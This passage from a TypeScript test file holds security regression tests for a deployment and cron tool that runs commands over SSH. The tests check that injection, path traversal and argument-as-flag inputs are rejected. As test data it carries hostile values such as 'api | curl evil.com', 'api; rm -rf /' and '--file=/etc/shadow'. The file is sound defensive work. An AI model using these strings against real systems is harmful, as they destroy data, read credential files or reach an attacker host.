  });
  it('rejects dollar-sign subshell', () => {
    assert.throws(() => validateDeployService('api$(id)'), /Invalid deploy service name/);
  });
  it('rejects leading hyphen (flag injection)', () => {
    assert.throws(() => validateDeployService('-x'), /Invalid deploy service name/);
  });
  it('rejects path traversal via dots and slash', () => {
    assert.throws(() => validateDeployService('../../../etc/passwd'), /Invalid deploy service name/);
  });
  it('rejects path traversal via ".."', () => {
    assert.throws(() => validateDeployService('a/../b'), /Invalid deploy service name/);
  });
  it('rejects forward slash', () => {
    assert.throws(() => validateDeployService('a/b'), /Invalid deploy service name/);
  });
  it('rejects space in name', () => {
    assert.throws(() => validateDeployService('api worker'), /Invalid deploy service name/);
  });
  it('rejects pipe injection', () => {
    assert.throws(() => validateDeployService('api | curl evil.com'), /Invalid deploy service name/);
  });
  it('rejects empty string', () => {
    assert.throws(() => validateDeployService(''), /must not be empty/);
  });
  it('rejects name longer than 64 chars', () => {
    assert.throws(() => validateDeployService('a'.repeat(65)), /too long/);
  });
});

// ============================================================================
// Security regression: handleOpenclawDeploy rejects injection in service name
// (wave 3 finding 1)
// ============================================================================

describe('handleOpenclawDeploy injection guard (security)', () => {
  it('rejects a service with semicolon injection', async () => {
    const result = await handleOpenclawDeploy(
      { service: 'api; rm -rf /', action: 'deploy' },
      { ...stubConfig, sshHost: '0.0.0.1' },
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid deploy service name/);
  });

  it('rejects a service with path traversal', async () => {
    const result = await handleOpenclawDeploy(
      { service: '../../etc/passwd', action: 'rollback' },
      { ...stubConfig, sshHost: '0.0.0.1' },
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid deploy service name/);
  });

  it('rejects a service with leading hyphen', async () => {
    const result = await handleOpenclawDeploy(
      { service: '-xvf /etc', action: 'status' },
      { ...stubConfig, sshHost: '0.0.0.1' },
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid deploy service name/);
  });

  it('accepts a valid service name (falls through to SSH error)', async () => {
    const result = await handleOpenclawDeploy(
      { service: 'api', action: 'status' },
      { ...stubConfig, sshHost: '0.0.0.1' },
    );
    // SSH to 0.0.0.1 will fail; validation must not block this.
    assert.ok(
      !(result.error ?? '').includes('Invalid deploy service name'),
      'error should be SSH-level, not service name validation',
    );
  });
});

// ============================================================================
// Security regression: handleCronRun rejects injection in job_id
// (wave 3 finding 2)
// ============================================================================

describe('handleCronRun injection guard (security)', () => {
  const cronConfig: Config = {
    ...stubConfig,
    sshHost: '0.0.0.1',
    haUrl: 'http://localhost',
  };

  it('rejects a job_id with semicolon injection', async () => {
    const result = await handleCronRun(
      { job_id: 'a1b2c3d4-e5f6-7890-abcd-ef1234567890; rm -rf /' },
      cronConfig,
    );
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid cron job ID/);
  });

  it('rejects a non-UUID job_id string', async () => {
    const result = await handleCronRun({ job_id: 'not-a-uuid' }, cronConfig);
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid cron job ID/);
  });

  it('rejects a job_id with leading hyphen', async () => {
    const result = await handleCronRun({ job_id: '-f /etc/cron.d/evil' }, cronConfig);
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid cron job ID/);
  });

  it('rejects an empty job_id', async () => {
    const result = await handleCronRun({ job_id: '' }, cronConfig);
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /must not be empty/);
  });

  it('accepts a valid UUID (falls through to SSH error, does not throw UUID validation)', async () => {
    // A well-formed UUID must pass validation. SSH to 0.0.0.1 is unreachable so
    // the handler may either return {success:false} or throw an SSH-level error.
    // Either outcome is acceptable; the important thing is that the error is NOT
    // a UUID validation rejection.
    try {
      const result = await handleCronRun(
        { job_id: 'a1b2c3d4-e5f6-7890-abcd-ef1234567890' },
        cronConfig,
      );
      if (!result.success) {
        assert.ok(
          !(result.error ?? '').includes('Invalid cron job ID'),
          'error should be SSH-level, not UUID validation',
        );
      }
    } catch (err) {
      // SSH-level throw is acceptable; UUID validation must not have fired.
      const msg = err instanceof Error ? err.message : String(err);
      assert.ok(
        !msg.includes('Invalid cron job ID'),
        'thrown error should be SSH-level, not UUID validation',
      );
    }
  });
});


// ============================================================================
// Argument injection - a caller value that arrives as a FLAG rather than data
// ============================================================================
//
// The defect that opened this class had no shell metacharacter in it. A value
// of "--announce" is alphanumerics and hyphens: it passes every metacharacter
// assertion in this file and is still a flag by the time the receiving program
// parses its argv, because the shell strips the quotes before that program is
// started. `--cron '--announce'` and `--cron --announce` are byte-identical
// argv.
//
// So these tests do not assert that a command string looks a particular way.
// They tokenise it the way a shell would, find the token the caller controls,
// and ask the only question that matters: is the receiving program still free
// to read it as an option?

/**
 * Tokenise a command the way a POSIX shell would, for the one property these
 * tests need - which argv tokens the receiving program is handed. Quotes and
 * backslash escapes are removed, exactly as the shell removes them; operators
 * survive as their own tokens so a pipeline can be split into segments.
 */
function shellTokens(command: string): string[] {
  const tokens: string[] = [];
  let current = '';
  let started = false;
  let i = 0;

  while (i < command.length) {
    const ch = command[i]!;

    if (ch === "'") {
      started = true;
      i += 1;
      while (i < command.length && command[i] !== "'") { current += command[i]; i += 1; }
      i += 1;
      continue;
    }
    if (ch === '"') {
      started = true;
      i += 1;
      while (i < command.length && command[i] !== '"') { current += command[i]; i += 1; }
      i += 1;
      continue;
    }
    if (ch === '\\' && i + 1 < command.length) {
      started = true;
      current += command[i + 1];
      i += 2;
      continue;
    }
    if (ch === ' ' || ch === '\t' || ch === '\n') {
      if (started) { tokens.push(current); current = ''; started = false; }
      i += 1;
      continue;
    }

    current += ch;
    started = true;
    i += 1;
  }
  if (started) tokens.push(current);
  return tokens;
}

const SHELL_OPERATORS = new Set(['|', '||', '&&', ';', '&']);

/**
 * Assert a caller-controlled value reaches the program that receives it as
 * DATA and not as an option.
 *
 * Data means one of exactly two things: an end-of-options marker ("--")
 * appears earlier in the SAME pipeline segment, or the token immediately
 * before it is grep's "-e", which names the next token as the pattern. The
 * search is scoped to the segment so that a "--" belonging to another command
 * on the same line cannot vouch for this one.
 *
 * Presence is asserted first, and every occurrence is then checked rather than
 * only the first. Without the presence assertion a renamed builder, a typo in
 * the expected value, or a builder that stopped emitting the value at all
 * would leave this function passing while checking nothing - which is the same
 * shape of mistake as the defect it is here to catch.
 */
function assertArrivesAsData(command: string, value: string): void {
  const tokens = shellTokens(command);
  const positions: number[] = [];
  tokens.forEach((token, index) => { if (token === value) positions.push(index); });

  assert.ok(
    positions.length > 0,
    `value ${JSON.stringify(value)} never appears as a token, so this assertion `
    + `would have checked nothing. Command: ${command}`,
  );

  for (const at of positions) {
    let segmentStart = 0;
    for (let i = at - 1; i >= 0; i -= 1) {
      if (SHELL_OPERATORS.has(tokens[i]!)) { segmentStart = i + 1; break; }
    }
    const before = tokens.slice(segmentStart, at);
    assert.ok(
      before.includes('--') || tokens[at - 1] === '-e',
      `${JSON.stringify(value)} reaches ${JSON.stringify(tokens[segmentStart])} at token `
      + `${at} with no end-of-options marker and no -e, so that program parses it as an `
      + `option. Command: ${command}`,
    );
  }
}

describe('shellTokens (the tokeniser these assertions rest on)', () => {
  it('removes quotes exactly as a shell does', () => {
    assert.deepEqual(shellTokens("grep -e '--file=/etc/shadow' -- a b"),
      ['grep', '-e', '--file=/etc/shadow', '--', 'a', 'b']);
  });
  it('keeps a quoted value with spaces as a single token', () => {
    assert.deepEqual(shellTokens("cron add --cron '0 9 * * 1-5'"),
      ['cron', 'add', '--cron', '0 9 * * 1-5']);
  });
  it("decodes the '\\'' escape back to a literal quote", () => {
    assert.deepEqual(shellTokens("echo 'it'\\''s'"), ['echo', "it's"]);
  });
  it('keeps pipeline operators as their own tokens', () => {
    assert.deepEqual(shellTokens('a | b && c'), ['a', '|', 'b', '&&', 'c']);
  });
});

describe('assertArrivesAsData (the assertion itself must be able to fail)', () => {
  it('fails when no end-of-options marker protects the value', () => {
    assert.throws(() => assertArrivesAsData("ls -lah '-rf'", '-rf'), /parses it as an option/);
  });
  it('fails when the value is absent rather than passing vacuously', () => {
    assert.throws(() => assertArrivesAsData('ls -lah -- x', '-rf'), /would have checked nothing/);
  });
  it('passes once the marker is there', () => {
    assertArrivesAsData("ls -lah -- '-rf'", '-rf');
  });
});

describe('openclaw_memory_search: the search term is grep\'s pattern operand', () => {
  it('a term that is a grep option arrives as the pattern', () => {
    assertArrivesAsData(buildMemorySearchCommand('--file=/etc/shadow', 14), '--file=/etc/shadow');
  });
  it('an ordinary term still arrives as the pattern', () => {
    assertArrivesAsData(buildMemorySearchCommand('deployment', 14), 'deployment');
  });
  it('a term made only of hyphens and letters is still only a pattern', () => {
    // The whole point of the class: this value carries no shell metacharacter,
    // passes every metacharacter assertion in this file, and was still an
    // option to grep. The value has to be one that does not also occur as a
    // literal elsewhere in the command, or the assertion checks the wrong token.
    assertArrivesAsData(buildMemorySearchCommand('--recursive', 14), '--recursive');
  });
});

describe('openclaw_logs: filter is grep\'s pattern, path is tail\'s file', () => {
  it('a filter that is a grep option arrives as the pattern, in every fallback', () => {
    // The gateway branch pipes through grep twice, once per fallback. Both
    // occurrences are checked; protecting only the first would be the same
    // defect surviving in the branch that runs when journalctl is absent.
    assertArrivesAsData(
      buildLogsCommand({ source: 'gateway', lines: 50, filter: '--file=/etc/shadow' }),
      '--file=/etc/shadow',
    );
  });
  it('a path of "-f" is a path, not a follow that hangs the connection', () => {
    assertArrivesAsData(buildLogsCommand({ source: 'custom', lines: 50, path: '-f' }), '-f');
  });
  it('an ordinary custom path still arrives as the file', () => {
    assertArrivesAsData(
      buildLogsCommand({ source: 'custom', lines: 50, path: '/var/log/syslog' }),
      '/var/log/syslog',
    );
  });
  it('reports an unusable request instead of building a command', () => {
    assert.throws(() => buildLogsCommand({ source: 'custom', lines: 50 }), /"path" is required/);
    assert.throws(() => buildLogsCommand({ source: 'nope', lines: 50 }), /Unknown source/);
  });
});

describe('file_transfer: remote_path is an operand of ls, stat, base64 and mkdir', () => {
  it('list refuses to hand ls its own flag', () => {
    assertArrivesAsData(buildListCommand('-rf'), '-rf');
  });
  it('size refuses to hand stat its own flag', () => {
    assertArrivesAsData(buildSizeCommand('--help'), '--help');
  });
  it('read refuses to hand base64 its own flag', () => {
    assertArrivesAsData(buildReadCommand('-d'), '-d');
  });
  it('write protects the directory operand it derives from the path', () => {
    assertArrivesAsData(buildWriteCommand('-rf/note.txt', 'QUFB'), '-rf');
  });
  it('ordinary paths are unaffected', () => {
    assertArrivesAsData(buildListCommand('~/scripts'), '~/scripts');
    assertArrivesAsData(buildReadCommand('/etc/hostname'), '/etc/hostname');
  });
  it('the redirection target stays quoted', () => {
    // A redirect is consumed by the shell, not by a program's argv, so there
    // is no option grammar to escape and no marker that would apply. Quoting
    // is the whole defence there, and it is what is asserted.
    assert.ok(buildWriteCommand('-rf/note.txt', 'QUFB').includes("> '-rf/note.txt'"));
  });
});

describe('validateCronExpression (security)', () => {
  it('accepts a five-field expression with spaces and asterisks', () => {
    assert.equal(validateCronExpression('0 9 * * 1-5'), '0 9 * * 1-5');
  });
  it('accepts a shorthand expression', () => {
    assert.equal(validateCronExpression('@daily'), '@daily');
  });
  it('accepts an interior hyphen, which is a range and not a flag', () => {
    assert.equal(validateCronExpression('0 0 * * 1-5'), '0 0 * * 1-5');
  });
  it('rejects a leading hyphen', () => {
    assert.throws(() => validateCronExpression('--announce'), /must not start with a hyphen/);
  });
  it('rejects a single-hyphen flag', () => {
    assert.throws(() => validateCronExpression('-f'), /must not start with a hyphen/);
  });
  it('rejects an empty expression', () => {
    assert.throws(() => validateCronExpression(''), /must not be empty/);
  });
  it('rejects an over-long expression', () => {
    assert.throws(() => validateCronExpression('0'.repeat(129)), /too long/);
  });
});

describe('openclaw cron add: every schedule branch, not only the two that were fixed', () => {
  const base = { name: 'nightly', message: 'run the report' };

  it('refuses a --cron value that opens with a hyphen', () => {
    assert.throws(
      () => buildCronCreateCommand({ ...base, schedule: '--announce' }),
      /must not start with a hyphen/,
    );
  });
  it('still refuses the --every value this class was found through (regression)', () => {
    assert.throws(
      () => buildCronCreateCommand({ ...base, schedule: 'every --announce' }),
      /Invalid schedule value/,
    );
  });
  it('still refuses an --at value that opens with a hyphen (regression)', () => {
    assert.throws(
      () => buildCronCreateCommand({ ...base, schedule: 'at --announce' }),
      /Invalid schedule value/,
    );
  });
  it('refuses a channel that opens with a hyphen', () => {
    assert.throws(
      () => buildCronCreateCommand({ ...base, schedule: '0 9 * * *', channel: '--to=+490000' }),
      /Invalid channel/,
    );
  });

  it('keeps a real cron expression intact as one token', () => {
    const cmd = buildCronCreateCommand({ ...base, schedule: '0 9 * * 1-5' });
    assert.ok(
      shellTokens(cmd).includes('0 9 * * 1-5'),
      `the schedule did not survive quoting as a single token: ${cmd}`,
    );
  });
  it('keeps a real "every" schedule working', () => {
    assert.ok(shellTokens(buildCronCreateCommand({ ...base, schedule: 'every 30m' })).includes('30m'));
  });

  it('puts --announce on the line only when a channel was asked for', () => {
    // Both directions. Without this the assertion above could be satisfied by
    // a builder that never emits --announce at all.
    const without = shellTokens(buildCronCreateCommand({ ...base, schedule: '0 9 * * *' }));
    assert.ok(!without.includes('--announce'), '--announce appeared with no channel');

    const withChannel = shellTokens(
      buildCronCreateCommand({ ...base, schedule: '0 9 * * *', channel: 'whatsapp' }),
    );
    assert.ok(withChannel.includes('--announce'), '--announce missing with a channel');
    assert.ok(withChannel.includes('whatsapp'));
  });
});

describe('openclaw_notify: the channel is validated before the line is built', () => {
  it('rejects a channel that would arrive as a flag, without reaching SSH', async () => {
    const result = await handleOpenclawNotify(
      { message: 'hello', channel: '--announce' },
      { ...stubConfig, sshHost: '0.0.0.1' },
    ) as { success: boolean; error?: string };
    assert.equal(result.success, false);
    assert.match(result.error ?? '', /Invalid channel/);
  });
});
